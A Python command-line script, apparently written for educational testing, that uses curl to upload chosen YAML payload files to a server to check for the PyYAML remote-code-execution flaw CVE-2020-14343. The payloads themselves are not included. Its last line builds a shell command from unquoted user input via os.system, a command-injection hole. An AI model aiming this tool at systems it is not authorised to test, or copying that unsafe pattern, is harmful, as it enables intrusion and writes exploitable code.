import os
import sys

from utils import (ArgumentParser, BLUE, BOLD, MyFormatter, NC, RED, YELLOW,
                   color_msg as c, get_default_message)

VERSION = '0.1a'
PAYLOADS = [f'payload0{i}.yaml' for i in range(1, 5)]
_CUSTOM_OPTION = ('--cp', '--custom-payload')
_DEFAULT_OPTION = ('--dp', '--default-payload')


def get_usage():
    return f'{BLUE}{os.path.basename(__file__)} [OPTIONS]{NC}'


def setup_argparser():
    width = os.get_terminal_size().columns - 5
    parser = ArgumentParser(
        description=f'''
Script for sending yaml files to your local server in order to test if the server is 
affected by the CVE-2020-14343 PyYAML vulnerability which allows a maliciously crafted 
yaml file to execute remote code on a server that might be vulnerable.

{RED}IMPORTANT:{NC} this code is for educational and informational purposes only. The 
author, raul23, assumes no responsibility for the use of this code or any information 
contained therein. The user is solely responsible for any action he/she takes with this 
code and information contained in it.''',
        usage=get_usage(),
        add_help=False,
        # ArgumentDefaultsHelpFormatter
        # HelpFormatter
        # RawDescriptionHelpFormatter
        formatter_class=lambda prog: MyFormatter(
            prog, max_help_position=50, width=width))
    # ===============
    # General options
    # ===============
    general_group = parser.add_argument_group(f'{YELLOW}General options{NC}')
    general_group.add_argument('-h', '--help', action='help',
                               help='Show this help message and exit.')
    general_group.add_argument(
        '-v', '--version', action='version',
        version=f'%(prog)s v{VERSION}',
        help="Show program's version number and exit.")
    # ============
    # Send payload
    # ============
    send_group = parser.add_argument_group(f'{YELLOW}Send payload{NC}')
    send_group.add_argument(
        '--host', default='0.0.0.0:8080',
        help='Host and port of the server to connect, e.g. 0.0.0.0:8080')
    parser_edit_mutual_group = send_group.add_mutually_exclusive_group()
    parser_edit_mutual_group.add_argument(
        _DEFAULT_OPTION[0], _DEFAULT_OPTION[1], dest='default',
        choices=[i + 1 for i in range(len(PAYLOADS))], type=int,
        help='ID of the default payload to send to the server. Check the '
             f'corresponding yaml file of the payload ID: {PAYLOADS}')
    parser_edit_mutual_group.add_argument(
        _CUSTOM_OPTION[0], _CUSTOM_OPTION[1], dest='custom', metavar='FILE',
        help='Custom payload (yaml file) to send to the server.')
    return parser


def print_err(msg):
    print(f'usage: {get_usage()}')
    print(c(f'\nerror: {msg}', 'r'))


if __name__ == '__main__':
    parser = setup_argparser()
    args = parser.parse_args()
    payload = PAYLOADS[args.default - 1] if args.default else args.custom
    if payload is None:
        print_err(f'No payload was given either with the '
                  f'{_CUSTOM_OPTION[0]}/{_CUSTOM_OPTION[1]} '
                  f'or {_DEFAULT_OPTION[0]}/{_DEFAULT_OPTION[1]} argument')
        sys.exit(2)
    os.system(f'curl -F file=@{payload} http://{args.host}')
    sys.exit(0)
